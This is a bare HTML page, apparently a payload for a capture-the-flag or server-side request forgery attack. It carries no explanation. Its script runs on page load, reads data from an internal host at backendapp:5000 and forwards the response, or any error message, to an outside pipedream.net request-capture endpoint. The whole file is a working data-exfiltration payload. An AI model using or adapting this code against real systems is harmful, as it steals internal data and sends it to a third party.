<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <title>Document</title>
</head>

<body>
    <script>
        fetch(`http://backendapp:5000/product/1/data`, {
            method: "GET",
            mode: "no-cors",
        }).then((data) => {
            return data.text()
        }).then((data) => {
            return fetch(`https://eou8sltfe2g1usx.m.pipedream.net?data=${data}`, {
                method: "GET",
                mode: "no-cors",
            })
        }).catch((e) => {
            fetch(`https://eou8sltfe2g1usx.m.pipedream.net?data=${e.message}`, {
                method: "GET",
                mode: "no-cors",
            })
        })
    </script>
</body>

</html>
